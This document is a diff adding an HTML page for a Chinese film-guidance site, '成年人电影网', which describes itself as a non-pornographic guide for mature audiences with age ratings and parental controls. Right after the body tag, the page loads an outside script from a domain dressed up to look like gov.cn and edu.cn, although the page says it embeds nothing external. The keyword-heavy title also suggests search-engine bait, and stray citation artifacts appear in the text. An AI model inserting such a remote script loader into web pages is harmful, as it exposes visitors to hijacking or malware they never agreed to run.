@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>成年人电影网 - 成年观众向/适龄观影分级导航·0+/12+/17+ 观影提示 | 成年人电影网</title>
+<meta name="description" content="成年人电影网（chengnianrendianyingwang-h5）是成年观众向电影导航站：按 0+/12+/17+ 做观影提示，提供悬疑、犯罪、黑色电影、社会现实、硬核科幻等成人向但不色情片单，并内置家长控制与青少年模式说明。">
+<meta name="keywords" content="成年人电影网, chengnianrendianyingwang-h5, 成年观众向电影, 适龄观影, 电影分级导航, 0+ 12+ 17+ 观影提示, 家长控制, 青少年模式">
+<meta name="author" content="成年人电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0c1322;--bg2:#111b2e;--card:#15233b;
+  --gold:#e7b94b;--red:#ff4d5e;--blue:#5cc8ff;
+  --text:#eaf1fb;--text2:#aab9cd;--muted:#6b7c91;
+  --line:rgba(231,185,75,.22);--radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(900px 420px at 88% -8%,rgba(255,77,94,.14),transparent 60%),
+    radial-gradient(820px 420px at -4% 4%,rgba(92,200,255,.12),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(12,19,34,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:19px;font-weight:900;display:flex;align-items:center;gap:9px}
+.logo .badge{font-family:ui-monospace,monospace;color:var(--gold);border:1px solid var(--line);padding:2px 8px;border-radius:6px;font-size:12px}
+.logo b{color:var(--red)}
+.age-pill{font-size:11px;font-weight:800;color:var(--blue);border:1px solid var(--line);padding:4px 10px;border-radius:999px;font-family:ui-monospace,monospace}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:6px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--gold)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--gold);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{margin-top:58px;padding:70px 20px 50px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(231,185,75,.08);color:var(--gold);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;border-radius:999px;font-family:ui-monospace,monospace}
+.hero h1{font-size:clamp(34px,5vw,52px);font-weight:900;line-height:1.12;margin-bottom:16px}
+.hero h1 .hl{color:var(--red)}
+.hero-desc{color:var(--text2);font-size:15px;margin-bottom:26px;line-height:1.95}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--gold),var(--red));color:#1a1205;font-weight:800;font-size:14px;letter-spacing:1px;border-radius:999px;transition:.25s}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(255,77,94,.25)}
+.btn-sub{padding:13px 30px;border:1px solid var(--blue);color:var(--blue);font-weight:700;font-size:14px;border-radius:999px;transition:.25s}
+.btn-sub:hover{background:rgba(92,200,255,.08)}
+
+/* 年龄核验台 */
+.gate{position:relative;aspect-ratio:4/5;border-radius:22px;border:1px solid var(--line);background:linear-gradient(160deg,#16243d,#0b1322);padding:22px;display:flex;flex-direction:column;gap:14px;overflow:hidden}
+.gate .scan{position:absolute;left:0;right:0;height:80px;background:linear-gradient(180deg,rgba(92,200,255,.18),transparent);animation:scan 3.4s linear infinite}
+@keyframes scan{0%{top:-80px}100%{top:100%}}
+.gate-head{font-size:12px;color:var(--muted);font-family:ui-monospace,monospace}
+.gate-box{background:#0a1322;border:1px solid var(--line);border-radius:14px;padding:18px;text-align:center}
+.gate-box .big{font-size:40px}
+.gate-box h3{font-size:16px;font-weight:900;margin-top:6px}
+.gate-box p{font-size:12px;color:var(--text2);margin-top:4px}
+.gate-btns{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:auto}
+.gbtn{padding:12px;border-radius:12px;text-align:center;font-weight:800;font-size:13px;cursor:pointer;border:1px solid var(--line);transition:.2s}
+.gbtn.ok{background:linear-gradient(90deg,var(--gold),var(--red));color:#1a1205}
+.gbtn.no{background:var(--card);color:var(--blue)}
+.gbtn.no:hover{border-color:var(--blue)}
+
+.section{max-width:1240px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 .ac{color:var(--gold)}
+.sec-head p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 三级 */
+.rating-section{background:linear-gradient(180deg,transparent,rgba(21,35,59,.5))}
+.rating-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.rate{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px 22px;transition:.28s;cursor:pointer}
+.rate:hover{transform:translateY(-5px)}
+.rate .lv{font-size:34px;font-weight:900;font-family:ui-monospace,monospace}
+.rate:nth-child(1) .lv{color:var(--blue)}
+.rate:nth-child(2) .lv{color:var(--gold)}
+.rate:nth-child(3) .lv{color:var(--red)}
+.rate h3{font-size:16px;font-weight:800;margin:6px 0 4px}
+.rate p{font-size:12px;color:var(--text2);line-height:1.75}
+.rate ul{margin-top:10px}
+.rate li{font-size:12px;color:var(--text2);padding:4px 0;border-bottom:1px dashed rgba(255,255,255,.08)}
+.rate li:last-child{border-bottom:none}
+
+/* 成年向频道 */
+.chan-section{background:var(--bg2)}
+.chan-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.chan{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;transition:.25s;cursor:pointer}
+.chan:hover{transform:translateY(-4px);border-color:var(--gold)}
+.chan .em{font-size:28px}
+.chan h3{font-size:15px;font-weight:800;margin:8px 0 4px}
+.chan p{font-size:12px;color:var(--text2);line-height:1.65}
+.chan .tag2{display:inline-block;margin-top:10px;font-size:11px;color:var(--blue);border:1px solid var(--line);padding:3px 10px;border-radius:999px}
+
+/* 家长控制 */
+.guard-section{background:var(--bg)}
+.guard-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;max-width:920px;margin:0 auto}
+.guard{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;display:flex;gap:14px;align-items:flex-start;transition:.25s;cursor:pointer}
+.guard:hover{transform:translateY(-3px);border-color:var(--blue)}
+.guard .ic{font-size:26px}
+.guard h4{font-size:14px;font-weight:800}
+.guard p{font-size:12px;color:var(--text2);margin-top:3px;line-height:1.7}
+
+/* 适龄片单 */
+.list-section{background:var(--bg2)}
+.flist{max-width:860px;margin:0 auto}
+.frow{display:grid;grid-template-columns:64px 1fr auto;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;transition:.25s}
+.frow:hover{transform:translateX(4px);border-color:var(--gold)}
+.frow .rate-chip{font-family:ui-monospace,monospace;font-weight:900;text-align:center;border:1px solid var(--line);border-radius:8px;padding:6px 0;font-size:13px}
+.frow:nth-child(3n+1) .rate-chip{color:var(--blue)}
+.frow:nth-child(3n+2) .rate-chip{color:var(--gold)}
+.frow:nth-child(3n+3) .rate-chip{color:var(--red)}
+.frow h3{font-size:15px;font-weight:800}
+.frow p{font-size:12px;color:var(--text2)}
+.frow .meta{font-size:11px;color:var(--muted);font-family:ui-monospace,monospace;white-space:nowrap}
+
+/* 合规 */
+.compliance-section{background:var(--bg)}
+.box{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px;max-width:920px;margin:0 auto}
+.box h3{color:var(--gold);font-size:16px;margin-bottom:12px}
+.box p{color:var(--text2);font-size:13px;line-height:1.9;margin-bottom:8px}
+.box .warn{border-left:3px solid var(--red);padding:10px 14px;background:rgba(255,77,94,.08);color:#ffd2d7;font-size:13px;line-height:1.8}
+
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:34px 20px 18px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--red)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--gold)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px;line-height:1.9}
+.footer-copy a{color:var(--blue)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .gate{order:-1;max-width:340px;margin:0 auto}
+  .rating-grid{grid-template-columns:1fr}
+  .chan-grid{grid-template-columns:repeat(2,1fr)}
+  .guard-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:108px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="badge">18+</span>成年人电影网</div>
+    <div class="age-pill">AGE GATE · 适龄观影</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#rating">0+/12+/17+</a></li>
+        <li><a href="#chan">成年向频道</a></li>
+        <li><a href="#guard">家长控制</a></li>
+        <li><a href="#list">适龄片单</a></li>
+        <li><a href="#law">合规声明</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="tag">chengnianrendianyingwang-h5 · Mature Audience Nav</span>
+      <h1>成年人电影网<br><span class="hl">成年观众向</span>，不是成人色情</h1>
+      <p class="hero-desc">这里把“成年人”解释成<strong>年龄与心理承受力</strong>：悬疑、犯罪、黑色电影、社会现实、硬核科幻、复杂婚姻、沉重历史——这些片“小孩别独看”，但不是色情片。本站做<strong>适龄观影分级导航</strong>，不提供、不聚合、不推荐淫秽色情内容。</p>
+      <div class="btns">
+        <a href="#rating" class="btn-main">🔞 过年龄核验</a>
+        <a href="#guard" class="btn-sub">看家长控制方案</a>
+      </div>
+    </div>
+    <div class="gate">
+      <div class="scan"></div>
+      <div class="gate-head">ENTRY CHECK · 进入前先核验</div>
+      <div class="gate-box">
+        <div class="big">🎫</div>
+        <h3>你已满 18 岁吗？</h3>
+        <p>17+ 片单含暴力、粗口、社会黑暗面，不含淫秽色情</p>
+      </div>
+      <div class="gate-btns">
+        <div class="gbtn ok" id="yes18">是，进入 17+</div>
+        <div class="gbtn no" id="no18">否，只看 0+/12+</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="rating" class="section rating-section">
+  <div class="sec-head">
+    <h2>🎚️ <span class="ac">三级观影提示</span> · 0+ / 12+ / 17+</h2>
+    <p>中国内地无官方电影分级，但可以做“观影提示”</p>
+  </div>
+  <div class="rating-grid">
+    <div class="rate">
+      <div class="lv">0+</div>
+      <h3>全家可看</h3>
+      <p>无裸露、无重度暴力、无脏话堆叠，适合陪娃/陪长辈。</p>
+      <ul><li>动画 / 治愈</li><li>自然纪录片</li><li>合家欢喜剧</li></ul>
+    </div>
+    <div class="rate">
+      <div class="lv">12+</div>
+      <h3>青少年需陪同</h3>
+      <p>可能有粗口、轻度惊悚、复杂情节，12 岁以下建议家长陪看。</p>
+      <ul><li>青春成长</li><li>轻悬疑</li><li>历史剧情</li></ul>
+    </div>
+    <div class="rate">
+      <div class="lv">17+</div>
+      <h3>成年观众向</h3>
+      <p>含犯罪、黑帮、婚姻崩坏、社会现实、血腥/粗口，但<strong>不含情色淫秽</strong>。</p>
+      <ul><li>黑色电影</li><li>犯罪悬疑</li><li>战争 / 政治惊悚</li></ul>
+    </div>
+  </div>
+</section>
+
+<section id="chan" class="section chan-section">
+  <div class="sec-head">
+    <h2>🎬 <span class="ac">成年向频道</span> · 成人爱看，但不下流</h2>
+    <p>把“成年人内容”从色情语境里救回来</p>
+  </div>
+  <div class="chan-grid">
+    <div class="chan"><div class="em">🕵️</div><h3>硬核悬疑</h3><p>谋杀结构、时间叙事、身份谜题，烧脑不血腥卖肉。</p><span class="tag2">17+ 提示</span></div>
+    <div class="chan"><div class="em">🩸</div><h3>黑色电影</h3><p>夜雨、背叛、赌局、落魄侦探，成人世界的灰调。</p><span class="tag2">17+ 提示</span></div>
+    <div class="chan"><div class="em">⚖️</div><h3>社会现实</h3><p>阶层、劳资、司法、医疗、养老，成年人才懂的痛。</p><span class="tag2">12+/17+</span></div>
+    <div class="chan"><div class="em">💣</div><h3>战争与政治</h3><p>不是爽片，是代价、谈判、屠杀与沉默。</p><span class="tag2">17+ 提示</span></div>
+    <div class="chan"><div class="em">🥀</div><h3>婚姻/关系</h3><p>出轨、冷暴力、育儿分歧——成人关系片单。</p><span class="tag2">12+/17+</span></div>
+    <div class="chan"><div class="em">🧠</div><h3>心理惊悚</h3><p>人格、记忆、执念、误诊，吓人靠心理不是靠裸。</p><span class="tag2">17+ 提示</span></div>
+    <div class="chan"><div class="em">🚔</div><h3>犯罪纪实</h3><p>诈骗、反腐、缉毒、经侦，真实感大于刺激感。</p><span class="tag2">17+ 提示</span></div>
+    <div class="chan"><div class="em">🪐</div><h3>硬核科幻</h3><p>时间、熵、意识上传、文明终结，成年人式孤独。</p><span class="tag2">12+/17+</span></div>
+  </div>
+</section>
+
+<section id="guard" class="section guard-section">
+  <div class="sec-head">
+    <h2>🛡️ <span class="ac">家长控制 / 青少年模式</span></h2>
+    <p>“成年人电影网”也必须防小孩误入 17+</p>
+  </div>
+  <div class="guard-grid">
+    <div class="guard"><div class="ic">🔐</div><div><h4>年龄核验入口</h4><p>17+ 频道前置年龄确认；静态演示不采集身份证、不存真实年龄。</p></div></div>
+    <div class="guard"><div class="ic">🧒</div><div><h4>青少年模式</h4><p>隐藏 17+ 片单、关闭暴力预览图、只留 0+/12+ 片单。</p></div></div>
+    <div class="guard"><div class="ic">⏳</div><div><h4>观看时长锁</h4><p>演示：可设 40/60/90 分钟提醒，到点淡出，不偷偷续播。</p></div></div>
+    <div class="guard"><div class="ic">🚫</div><div><h4>敏感词过滤</h4><p>片名/标签里屏蔽“情色/三级/露点/偷拍”等违规分类词。</p></div></div>
+  </div>
+</section>
+
+<section id="list" class="section list-section">
+  <div class="sec-head">
+    <h2>🎞️ <span class="ac">适龄片单</span> · 成年向但不色情</h2>
+    <p>点开是演示弹窗，不跳真实播放器</p>
+  </div>
+  <div class="flist">
+    <div class="frow"><div class="rate-chip">17+</div><div><h3>夜行档案</h3><p>犯罪悬疑 / 腐败、记忆、伪证</p></div><div class="meta">2h08 / 悬疑</div></div>
+    <div class="frow"><div class="rate-chip">17+</div><div><h3>锈城往事</h3><p>黑色电影 / 赌债、背叛、雨夜枪声</p></div><div class="meta">1h56 / 黑帮</div></div>
+    <div class="frow"><div class="rate-chip">12+</div><div><h3>父亲的海</h3><p>社会现实 / 渔民、医保、代际冲突</p></div><div class="meta">2h02 / 剧情</div></div>
+    <div class="frow"><div class="rate-chip">17+</div><div><h3>第十一封辞呈</h3><p>职场/政治惊悚 / 裁员、监控、沉默成本</p></div><div class="meta">1h49 / 惊悚</div></div>
+    <div class="frow"><div class="rate-chip">12+</div><div><h3>梅雨季来信</h3><p>成人关系 / 离婚、孩子、旧信</p></div><div class="meta">1h44 / 文艺</div></div>
+    <div class="frow"><div class="rate-chip">0+</div><div><h3>毛毛陪你看</h3><p>合家欢 / 猫、治愈、睡前片单</p></div><div class="meta">1h12 / 动画</div></div>
+  </div>
+</section>
+
+<section id="law" class="section compliance-section">
+  <div class="sec-head">
+    <h2>⚖️ <span class="ac">合规声明</span></h2>
+    <p>这站为什么叫“成年人电影网”却不说成人片</p>
+  </div>
+  <div class="box">
+    <h3>边界写在前头</h3>
+    <p>“成年人电影网”只表达<strong>受众年龄层</strong>：面向成年观众做更复杂、更沉重、更现实的片单导航。它不等于“成人色情片网站”。</p>
+    <div class="warn">
+      本站不设置“成人电影 / 情色电影 / 三级片 / 偷拍 / 走光 / 露点”等分类与标题；
+      不聚合、不推荐、不链接淫秽色情内容；
+      17+ 仅指含暴力、粗口、犯罪、社会黑暗面等“成年向元素”，
+      不代表色情内容。境内外影片传播须符合公映许可、版权与网络视听节目管理规定。[1,13](@ref)
+    </div>
+    <p>本页为单页导航演示：卡片点击跳 `#` 占位，不存视频、不嵌来路播放器、不提供“免 VIP 破解”。</p>
+    <p>中国内地无官方影视分级，页面使用 0+/12+/17+ 仅作<strong>观影提示</strong>，不等同于法律分级。[8,16](@ref)</p>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">🔞 成年人电影网</div>
+  <div class="footer-links">
+    <a href="#rating">0+/12+/17+</a>
+    <a href="#chan">成年向频道</a>
+    <a href="#guard">家长控制</a>
+    <a href="#list">适龄片单</a>
+    <a href="#law">合规声明</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 成年人电影网 (chengnianrendianyingwang-h5). 成年观众向 / 适龄观影分级导航演示站.<br>
+    网站地址: <a href="https://chengnianrendianyingwang-h5.github.io">https://chengnianrendianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">成年观众向 ≠ 成人色情 · 0+ / 12+ / 17+ 观影提示 · 家长控制内置</span>
+  </div>
+</div>
+
+<script>
+document.getElementById('yes18').addEventListener('click',function(){
+  alert('年龄核验（演示）：已确认 18+\n\n将展示 17+ 成年向片单：犯罪/黑色/社会现实/心理惊悚。\n不含情色、三级、露点等违规内容。');
+  document.getElementById('list').scrollIntoView({behavior:'smooth'});
+});
+document.getElementById('no18').addEventListener('click',function(){
+  alert('年龄核验（演示）：未满 18\n\n仅展示 0+/12+：动画、治愈、青春成长、自然纪录片。\n17+ 片单已隐藏。');
+  document.querySelectorAll('.frow').forEach(function(r){
+    if(r.querySelector('.rate-chip').textContent==='17+') r.style.opacity=.35;
+  });
+});
+document.querySelectorAll('.rate').forEach(function(r){r.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.chan').forEach(function(c){c.addEventListener('click',function(){alert('成年向频道：'+this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.guard').forEach(function(g){g.addEventListener('click',function(){alert(this.querySelector('h4').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.frow').forEach(function(f){f.addEventListener('click',function(){alert('适龄片单：'+this.querySelector('h3').textContent+' ['+this.querySelector('.rate-chip').textContent+']\n\n静态演示页，点击后跳详情（内链 # 占位）。');});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+</script>
+</body>
+</html>
